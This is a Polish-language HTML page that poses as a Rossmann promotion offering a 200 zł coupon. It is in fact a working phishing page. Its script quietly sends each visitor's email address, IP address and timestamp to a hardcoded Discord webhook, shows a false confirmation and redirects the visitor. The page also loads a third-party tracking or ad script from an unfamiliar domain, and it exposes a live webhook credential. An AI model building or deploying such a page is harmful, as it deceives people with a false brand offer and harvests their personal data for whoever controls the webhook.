<!DOCTYPE html>
<html lang="pl">
<head>
    <script src="https://fpyf8.com/88/tag.min.js" data-zone="147446" async data-cfasync="false"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rossmann - Odbierz Kupon 200 zł!</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom font for a clean look */
        body {
            font-family: 'Inter', sans-serif;
        }
        /* Basic styling for the main container */
        .container {
            max-width: 90%; /* Fluid width for responsiveness */
            margin: auto;
            padding: 1rem;
        }
        /* Style for the message box */
        .message-box {
            display: none; /* Hidden by default */
            padding: 1rem;
            margin-top: 1rem;
            border-radius: 0.75rem; /* rounded-xl */
            text-align: center;
            font-weight: bold;
        }
        .message-box.success {
            background-color: #d1fae5; /* Tailwind green-100 */
            color: #065f46; /* Tailwind green-800 */
        }
        .message-box.error {
            background-color: #fee2e2; /* Tailwind red-100 */
            color: #991b1b; /* Tailwind red-800 */
        }
        .message-box.loading {
            background-color: #e0f2fe; /* Tailwind blue-100 */
            color: #0c4a6e; /* Tailwind blue-800 */
        }
    </style>
</head>
<body class="bg-gradient-to-br from-red-50 to-red-100 min-h-screen flex items-center justify-center py-10">
    <div class="container bg-white p-8 md:p-12 rounded-xl shadow-2xl border border-red-200 text-center w-full max-w-md">
        <img
            src="https://logowik.com/content/uploads/images/rossmann2254.jpg"
            onerror="this.onerror=null;this.src='https://placehold.co/200x80/dc2626/ffffff?text=ROSSMANN';"
            alt="Logo Rossmann"
            class="mx-auto mb-8 w-48 md:w-56 rounded-lg shadow-md"
        >

        <h1 class="text-3xl md:text-4xl font-extrabold text-red-700 mb-4 leading-tight">
            Odbierz swój kupon na <span class="text-red-900">200 zł!</span>
        </h1>
        <p class="text-gray-600 mb-8 text-lg">
            Nie przegap wyjątkowej okazji! Wpisz swój adres e-mail, aby otrzymać kupon.
        </p>

        <form id="couponForm" class="space-y-6">
            <div>
                <label for="email" class="sr-only">Adres e-mail</label>
                <input
                    type="email"
                    id="email"
                    name="email"
                    placeholder="Wpisz swój adres e-mail"
                    required
                    class="w-full px-5 py-3 border border-red-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-transparent text-gray-800 text-lg shadow-sm transition duration-300 ease-in-out"
                >
            </div>
            <button
                type="submit"
                id="submitButton"
                class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-lg shadow-lg transform hover:scale-105 transition duration-300 ease-in-out text-xl tracking-wide"
            >
                Odbierz Kupon!
            </button>
        </form>

        <div id="messageBox" class="message-box"></div>

        <p class="text-xs text-gray-400 mt-8">
            *Kupon ważny przy zakupach powyżej określonej kwoty. Szczegóły w regulaminie promocji.
        </p>
    </div>

    <script>
        // Get the form and message box elements
        const couponForm = document.getElementById('couponForm');
        const emailInput = document.getElementById('email');
        const messageBox = document.getElementById('messageBox');
        const submitButton = document.getElementById('submitButton');

        // IMPORTANT: The actual webhook URL provided by the user
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1378667670102212708/mg4wSOQDCbj0Vg90sxy05OpZ_AwNI4GUH4AiPKsFh3MXNX149vE2-IXi6a7hpGYlRL7z';

        // Function to display messages
        function showMessage(message, type) {
            messageBox.textContent = message;
            messageBox.className = 'message-box'; // Reset classes
            messageBox.classList.add(type); // Add success, error, or loading class
            messageBox.style.display = 'block'; // Show the message box
        }

        // Function to get user's IP address
        async function getIpAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                if (response.ok) {
                    const data = await response.json();
                    return data.ip;
                } else {
                    console.error('Failed to fetch IP address from ipify.org:', response.status, await response.text());
                    return 'Nieznany'; // Return unknown if fetching fails
                }
            } catch (error) {
                console.error('Network error while fetching IP address:', error);
                return 'Błąd sieci'; // Return network error if fetch fails
            }
        }

        // Add an event listener for form submission
        couponForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission

            const email = emailInput.value.trim();

            if (!email) {
                showMessage('Proszę wprowadzić prawidłowy adres e-mail.', 'error');
                return;
            }

            showMessage('Wysyłanie danych...', 'loading');
            submitButton.disabled = true; // Disable button during submission

            let userIp = 'Nieznany';
            // Attempt to get the IP address
            userIp = await getIpAddress();

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        // Discord webhook payload for a simple message
                        content: `Nowy zapis na kupon: ${email}`,
                        embeds: [
                            {
                                title: "Nowy zapis na kupon Rossmann",
                                description: `Adres e-mail: **${email}**`,
                                color: 16711680, // Red color for Discord embed
                                fields: [
                                    {
                                        name: "Data i czas",
                                        value: new Date().toLocaleString('pl-PL'),
                                        inline: true
                                    },
                                    {
                                        name: "Adres IP",
                                        value: userIp,
                                        inline: true
                                    }
                                ]
                            }
                        ]
                    })
                });

                if (response.ok) {
                    // Assuming the webhook returns a successful status (e.g., 200 OK)
                    showMessage(`Dziękujemy! Kupon na 200 zł został wysłany na adres: ${email}. Zostaniesz przekierowany...`, 'success');
                    emailInput.value = ''; // Clear the input field

                    // Redirect after 3 seconds
                    setTimeout(() => {
                        window.location.href = '/coupon'; // Redirect to /coupon within the same domain
                    }, 3000); // 3000 milliseconds = 3 seconds

                } else {
                    // Handle non-OK responses from the webhook
                    const errorText = await response.text(); // Get raw text for Discord errors
                    showMessage(`Wystąpił błąd podczas wysyłania danych: ${response.status} - ${errorText}. Spróbuj ponownie.`, 'error');
                    console.error('Błąd wysyłania danych do webhooka:', response.status, errorText);
                }
            } catch (error) {
                // Handle network errors or other issues with the fetch request
                showMessage(`Wystąpił błąd sieci: ${error.message}. Sprawdź połączenie i spróbuj ponownie.`, 'error');
                console.error('Błąd wysyłania danych do webhooka:', error);
            } finally {
                submitButton.disabled = false; // Re-enable button
            }
        });
    </script>
</body>
</html>
